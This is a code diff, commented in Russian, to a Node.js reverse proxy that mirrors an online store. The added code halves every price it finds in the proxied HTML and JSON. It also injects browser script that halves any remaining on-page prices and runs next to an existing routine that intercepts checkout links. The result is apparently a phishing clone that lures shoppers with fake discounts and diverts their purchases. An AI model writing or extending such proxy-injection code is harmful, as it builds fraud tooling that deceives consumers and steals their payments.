@@ -147,6 +147,50 @@ const proxyOptions = {
       });
       
       proxyRes.on('end', () => {
+        // Изменяем цены в HTML - делим на 2
+        let modifiedBody = body;
+        
+        // Ищем и заменяем цены в различных форматах
+        const pricePatterns = [
+          // USD $3,500.00 -> $1,750.00
+          /\$(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)/g,
+          // USD 3500.00 -> 1750.00
+          /USD\s+(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)/g,
+          // 3500.00 USD -> 1750.00 USD
+          /(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)\s+USD/g,
+          // Цены в скобках (USD $3,500.00)
+          /\(USD\s+\$(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)\)/g,
+          // Цены в data атрибутах
+          /data-price="(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)"/g,
+          // Цены в JSON
+          /"price":\s*(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)/g,
+          // Цены в span с классом price
+          /<span[^>]*class="[^"]*price[^"]*"[^>]*>\s*\$?(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)\s*<\/span>/g
+        ];
+        
+        pricePatterns.forEach(pattern => {
+          modifiedBody = modifiedBody.replace(pattern, (match, price) => {
+            // Убираем запятые и конвертируем в число
+            const cleanPrice = price.replace(/,/g, '');
+            const originalPrice = parseFloat(cleanPrice);
+            
+            if (!isNaN(originalPrice) && originalPrice > 0) {
+              // Делим на 2 и округляем до 2 знаков
+              const newPrice = Math.round(originalPrice / 2 * 100) / 100;
+              
+              // Форматируем обратно с запятыми
+              const formattedPrice = newPrice.toLocaleString('en-US', {
+                minimumFractionDigits: 2,
+                maximumFractionDigits: 2
+              });
+              
+              console.log(`💰 Price changed: $${price} -> $${formattedPrice}`);
+              return match.replace(price, formattedPrice);
+            }
+            return match;
+          });
+        });
+        
         // Добавляем скрипт перехвата перед закрывающим тегом </body>
         const checkoutScript = `
           <script>
@@ -259,12 +303,76 @@ const proxyOptions = {
               // Запускаем перехват ссылок
               setTimeout(interceptAllCheckoutLinks, 1000);
               setTimeout(interceptAllCheckoutLinks, 3000);
+              
+              // 🎯 ИЗМЕНЕНИЕ ЦЕН НА СТРАНИЦЕ
+              function modifyPricesOnPage() {
+                console.log('💰 Modifying prices on page...');
+                
+                // Ищем все элементы с ценами
+                const priceSelectors = [
+                  '[class*="price"]',
+                  '[class*="cost"]',
+                  '[class*="amount"]',
+                  '[data-price]',
+                  'span:contains("$")',
+                  'div:contains("USD")',
+                  'p:contains("$")'
+                ];
+                
+                priceSelectors.forEach(selector => {
+                  try {
+                    const elements = document.querySelectorAll(selector);
+                    elements.forEach(element => {
+                      const text = element.textContent || element.innerText || '';
+                      const priceMatch = text.match(/\$(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)/);
+                      
+                      if (priceMatch) {
+                        const originalPrice = priceMatch[1];
+                        const cleanPrice = originalPrice.replace(/,/g, '');
+                        const priceValue = parseFloat(cleanPrice);
+                        
+                        if (!isNaN(priceValue) && priceValue > 0) {
+                          const newPrice = Math.round(priceValue / 2 * 100) / 100;
+                          const formattedPrice = newPrice.toLocaleString('en-US', {
+                            minimumFractionDigits: 2,
+                            maximumFractionDigits: 2
+                          });
+                          
+                          const newText = text.replace(priceMatch[0], '$' + formattedPrice);
+                          element.textContent = newText;
+                          console.log('💰 Client price changed:', priceMatch[0], '->', '$' + formattedPrice);
+                        }
+                      }
+                    });
+                  } catch (e) {
+                    // Игнорируем ошибки селекторов
+                  }
+                });
+                
+                // Также изменяем цены в data атрибутах
+                const elementsWithDataPrice = document.querySelectorAll('[data-price]');
+                elementsWithDataPrice.forEach(element => {
+                  const price = element.getAttribute('data-price');
+                  const priceValue = parseFloat(price);
+                  
+                  if (!isNaN(priceValue) && priceValue > 0) {
+                    const newPrice = Math.round(priceValue / 2 * 100) / 100;
+                    element.setAttribute('data-price', newPrice.toString());
+                    console.log('💰 Data price changed:', price, '->', newPrice);
+                  }
+                });
+              }
+              
+              // Запускаем изменение цен
+              setTimeout(modifyPricesOnPage, 500);
+              setTimeout(modifyPricesOnPage, 2000);
+              setTimeout(modifyPricesOnPage, 5000);
             })();
           </script>
         `;
         
         // Вставляем скрипт перед </body>
-        const modifiedBody = body.replace('</body>', checkoutScript + '</body>');
+        modifiedBody = modifiedBody.replace('</body>', checkoutScript + '</body>');
         
         if (!res.headersSent) {
           res.setHeader('Content-Length', Buffer.byteLength(modifiedBody));
